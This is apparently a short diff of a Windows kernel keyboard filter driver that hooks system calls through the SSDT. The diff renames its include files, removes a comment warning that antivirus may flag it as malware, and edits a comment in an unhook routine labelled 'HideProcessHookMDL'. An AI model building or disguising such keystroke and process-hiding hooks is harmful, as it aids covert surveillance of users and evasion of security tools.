@@ -4,13 +4,12 @@
  * Description: Outbond Keyboard Filter Driver. This file holds the driver
  *              entry point, basic request dispatch, and unload functions.
  * Environment: Kernel mode only
- * Note: Might be picked up as malware by AV
  */
 
-#include "obdriver.h"
-#include "obhook.h"
-#include "obscancode.h"
-#include "obthread.h"
+#include "driver.h"
+#include "hook.h"
+#include "scancode.h"
+#include "thread.h"
 
 ZWWRITEFILE   OldZwWriteFile;
 ZWCREATEFILE  OldZwCreateFile;
@@ -154,7 +153,7 @@ Unload(
 
 	//***Begin HideProcessHookMDL SSDT hook code***
 
-	// Unhook SSDT call
+	// Unhook SSDT call, disable interrupts first
 	_asm{cli}
 	UNHOOK_SYSCALL(ZwWriteFile, OldZwWriteFile, NewZwWriteFile);
 	_asm{sti}
